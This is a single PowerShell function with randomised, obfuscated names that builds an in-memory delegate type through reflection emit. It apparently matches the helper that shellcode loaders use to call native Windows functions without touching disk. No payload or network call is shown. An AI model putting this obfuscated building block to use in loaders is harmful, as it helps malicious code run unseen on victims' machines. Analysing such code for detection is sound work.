Function yuXTsejtdNMucKrl
{
    Param
    (
        [OutputType([Type])]
        [Parameter( Position = 0)] [Type[]] $ndlcdSWpJyUiR = (New-Object Type[](0)),
        [Parameter( Position = 1 )] [Type] $hovnRHnOfdgn = [Void]
    )

    $CKbOcpULcPqgctsFqb = [AppDomain]::CurrentDomain
    $oxkToqFtDKB = New-Object Reflection.AssemblyName( "ReflectedDelegate" )
    $YacKMrZaCYSrUobAI = $CKbOcpULcPqgctsFqb.DefineDynamicAssembly($oxkToqFtDKB, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $rDj = $YacKMrZaCYSrUobAI.DefineDynamicModule( "InMemoryModule", $false)

    $bKZdfJpIyESEbb = $rDj.DefineType( "MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass" , [System.MulticastDelegate])
    $utoCAMwCqxpbk = $bKZdfJpIyESEbb.DefineConstructor( "RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $ndlcdSWpJyUiR)
    $utoCAMwCqxpbk.SetImplementationFlags( "Runtime, Managed" )
    $nKTp = $bKZdfJpIyESEbb.DefineMethod( "Invoke", "Public, HideBySig, NewSlot, Virtual" , $hovnRHnOfdgn, $ndlcdSWpJyUiR)
    $nKTp.SetImplementationFlags( "Runtime, Managed" )

    return $bKZdfJpIyESEbb.CreateType()
}